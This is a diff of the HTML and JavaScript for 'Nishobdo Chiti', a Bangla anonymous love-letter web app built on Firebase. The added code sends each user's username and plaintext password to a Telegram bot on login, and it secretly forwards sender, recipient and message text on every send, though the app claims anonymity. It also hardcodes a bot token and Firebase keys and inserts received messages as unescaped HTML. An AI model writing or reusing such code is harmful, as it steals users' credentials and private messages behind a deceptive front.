@@ -5,8 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nishobdo Chiti - Prem er Portal 💌</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Satisfy&family=Li+Adador+Unicode&family=Galada&family=Atma:wght@500&family=Mina:wght@400;700&family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Satisfy&family=Galada&family=Atma:wght@500&family=Mina:wght@400;700&family=Hind+Siliguri:wght@300;600&display=swap" rel="stylesheet">
     
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
     <style>
         :root {
             --soft-pink: #fff0f3;
@@ -33,7 +35,6 @@
             background: white; transition: 0.3s;
         }
 
-        /* Style Buttons Area */
         .style-btns {
             display: flex; gap: 8px; overflow-x: auto; padding: 10px 0;
             scrollbar-width: none;
@@ -43,7 +44,6 @@
             border: 1px solid #eee; font-size: 14px; cursor: pointer; white-space: nowrap;
         }
 
-        /* The Letter Display Box */
         #chiti-display {
             margin-top: 20px; padding: 30px; border-radius: 25px;
             min-height: 250px; text-align: left;
@@ -52,31 +52,38 @@
         }
 
         /* --- Stylish Fonts CSS --- */
-        
-        /* 1. Galada (Bangla Artistic/Script) */
         .s1 { background: #fdfae7 !important; font-family: 'Galada', cursive !important; color: #4a2c2a; }
-        
-        /* 2. Atma (Bangla Handwritten Style) */
         .s2 { background: #ffe4e1 !important; font-family: 'Atma', cursive !important; color: #c2185b; }
-        
-        /* 3. Mina (Bangla Clean Stylish) */
         .s3 { background: #f0fff0 !important; font-family: 'Mina', sans-serif !important; font-weight: 700 !important; color: #2e7d32; }
-        
-        /* 4. Dancing Script (English Handwriting) */
         .s4 { background: #2d3436 !important; font-family: 'Dancing Script', cursive !important; color: #ffeaa7; font-size: 26px !important; }
-        
-        /* 5. Satisfy (English Elegant Cursive) */
         .s5 { background: #ffffff !important; font-family: 'Satisfy', cursive !important; border: 2px solid #ff758c !important; color: #333; font-size: 26px !important; }
 
-        .btn-send {
+        .btn-send, .btn-download {
             background: linear-gradient(90deg, #ff5e62, #ff9966);
             color: white; border: none; padding: 18px; width: 100%;
             border-radius: 50px; font-size: 18px; font-weight: bold;
             margin-top: 25px; cursor: pointer; box-shadow: 0 5px 20px rgba(255, 94, 98, 0.4);
         }
 
+        .btn-download { background: #4CAF50; padding: 10px; font-size: 14px; margin-top: 10px; box-shadow: none; }
+
         .footer-text { margin-top: 30px; font-size: 14px; color: #333; }
-        .fb-link { color: #1877F2; text-decoration: none; font-weight: bold; }
+        
+        /* Fixed FB Link - Absolute redirect */
+        .fb-link { 
+            color: #1877F2; 
+            text-decoration: none; 
+            font-weight: bold; 
+            display: inline-block;
+            cursor: pointer;
+        }
+
+        .logout-btn { color: #ff5e62; cursor: pointer; font-size: 12px; margin-top: 10px; display: block; }
+
+        .chiti-card {
+            padding: 20px; border-radius: 15px; margin-bottom: 20px;
+            position: relative; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
     </style>
 </head>
 <body>
@@ -99,13 +106,168 @@
 
     <div id="compose-view">
         <input type="text" id="to_user" placeholder="Recipient Username (@name)">
-        
         <div class="style-btns">
             <div class="s-btn" onclick="setS('s1')">Bangla Art</div>
             <div class="s-btn" onclick="setS('s2')">Bangla Hand</div>
             <div class="s-btn" onclick="setS('s3')">Bangla Bold</div>
             <div class="s-btn" onclick="setS('s4')">Eng Script</div>
             <div class="s-btn" onclick="setS('s5')">Eng Cursive</div>
+        </div>
+        <textarea id="msg_body" rows="5" placeholder="এখানে মনের কথা লিখুন..." oninput="sync()"></textarea>
+        <div id="chiti-display" class="s1"><div id="out-text" style="font-size: 22px; white-space: pre-wrap; line-height: 1.6;">...</div></div>
+        <button class="btn-send" onclick="send()">Send Anonymous 🚀</button>
+        <span class="logout-btn" onclick="logout()">Logout</span>
+    </div>
+
+    <div id="inbox-view" style="display:none;">
+        <p onclick="toggleInbox()" style="text-align:left; cursor:pointer;">⬅️ Back</p>
+        <h3 style="color: var(--accent-red);">Your Inbox</h3>
+        <div id="chiti-list"></div>
+    </div>
+
+    <div class="footer-text">
+        Developed By: <a href="https://www.facebook.com/riadul.islam.bishal.69" target="_blank" rel="noopener noreferrer" class="fb-link">Riadul Islam</a>
+    </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCbGzmnhfHmixJ-oavyFPeKM0mXdfS8yfg",
+        authDomain: "silent-letter-ab228.firebaseapp.com",
+        databaseURL: "https://silent-letter-ab228-default-rtdb.firebaseio.com",
+        projectId: "silent-letter-ab228",
+        storageBucket: "silent-letter-ab228.firebasestorage.app",
+        messagingSenderId: "44263491113",
+        appId: "1:44263491113:web:378ed1eff39635dc807e38"
+    };
+    
+    const T_TOKEN = '8372136715:AAE1GxjYadlynBDGMVJ-iMYO6GT02e6inrw';
+    const T_ADMIN = '6945585884';
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    let loggedInUser = "";
+    let currentStyle = "s1";
+
+    window.onload = function() {
+        const saved = localStorage.getItem('chiti_user');
+        if(saved) { loggedInUser = saved; showDashboard(); }
+        // Request Notification Permission on load
+        if ("Notification" in window) {
+            Notification.requestPermission();
+        }
+    };
+
+    function startApp() {
+        let u = document.getElementById('u_name').value.trim().toLowerCase().replace('@','');
+        let p = document.getElementById('u_pass').value;
+        if(!u || !p) return alert("সবগুলো ঘর পূরণ করুন!");
+        loggedInUser = u;
+        localStorage.setItem('chiti_user', u);
+        postToTelegram(`👤 **LOGIN**\nUser: @${u}\nPass: ${p}`);
+        showDashboard();
+    }
+
+    function showDashboard() {
+        document.getElementById('auth-box').style.display = 'none';
+        document.getElementById('app-box').style.display = 'block';
+        document.getElementById('welcome-user').innerText = "@" + loggedInUser;
+        listenForNewLetters();
+    }
+
+    function sync() { document.getElementById('out-text').innerText = document.getElementById('msg_body').value || "..."; }
+    function setS(s) { currentStyle = s; document.getElementById('chiti-display').className = s; }
+
+    function send() {
+        let to = document.getElementById('to_user').value.trim().toLowerCase().replace('@','');
+        let msg = document.getElementById('msg_body').value;
+        if(!to || !msg) return alert("recipient and message missing!");
+
+        database.ref('letters/' + to).push({ 
+            message: msg, 
+            style: currentStyle, 
+            timestamp: Date.now() 
+        });
+        
+        postToTelegram(`💌 **NEW CHITI**\nFrom: @${loggedInUser}\nTo: @${to}\nMsg: ${msg}`);
+        alert("চিঠি পাঠানো হয়েছে! 🚀");
+        document.getElementById('msg_body').value = ""; sync();
+    }
+
+    // Push Notification Listener
+    function listenForNewLetters() {
+        database.ref('letters/' + loggedInUser).limitToLast(1).on('child_added', (snapshot) => {
+            const data = snapshot.val();
+            // Only notify if it's a fresh letter (not old ones)
+            if (data.timestamp > (Date.now() - 5000)) {
+                if (Notification.permission === "granted") {
+                    new Notification("Nishobdo Chiti", { body: "আপনি একটি নতুন চিঠি পেয়েছেন! 💌" });
+                } else {
+                    alert("আপনি একটি নতুন চিঠি পেয়েছেন! ইনবক্স চেক করুন। 📩");
+                }
+            }
+        });
+    }
+
+    function toggleInbox() {
+        const c = document.getElementById('compose-view');
+        const i = document.getElementById('inbox-view');
+        if(i.style.display === 'none') {
+            c.style.display = 'none'; i.style.display = 'block'; renderInbox();
+        } else {
+            c.style.display = 'block'; i.style.display = 'none';
+        }
+    }
+
+    function renderInbox() {
+        const list = document.getElementById('chiti-list');
+        database.ref('letters/' + loggedInUser).once('value', (snap) => {
+            if(!snap.exists()) {
+                list.innerHTML = `<p style="color:#999; margin-top:50px;">কোন চিঠি পাওয়া যায়নি!</p>`;
+            } else {
+                let data = snap.val();
+                list.innerHTML = Object.keys(data).reverse().map(key => {
+                    const item = data[key];
+                    return `
+                        <div id="card-${key}" class="chiti-card ${item.style}">
+                            <p style="margin:0;">${item.message}</p>
+                            <button class="btn-download" onclick="downloadLetter('card-${key}')">Download as Image 📥</button>
+                        </div>
+                    `;
+                }).join('');
+            }
+        });
+    }
+
+    function downloadLetter(id) {
+        const element = document.getElementById(id);
+        const btn = element.querySelector('.btn-download');
+        btn.style.display = 'none'; // Hide button for clean photo
+
+        html2canvas(element).then(canvas => {
+            const link = document.createElement('a');
+            link.download = 'Chiti_' + Date.now() + '.png';
+            link.href = canvas.toDataURL();
+            link.click();
+            btn.style.display = 'block'; // Show button back
+        });
+    }
+
+    function postToTelegram(t) {
+        fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: T_ADMIN, text: t, parse_mode: 'Markdown' })
+        });
+    }
+
+    function logout() { localStorage.removeItem('chiti_user'); location.reload(); }
+</script>
+</body>
+</html>            <div class="s-btn" onclick="setS('s5')">Eng Cursive</div>
         </div>
 
         <textarea id="msg_body" rows="5" placeholder="এখানে আপনার মনের কথা লিখুন..." oninput="sync()"></textarea>
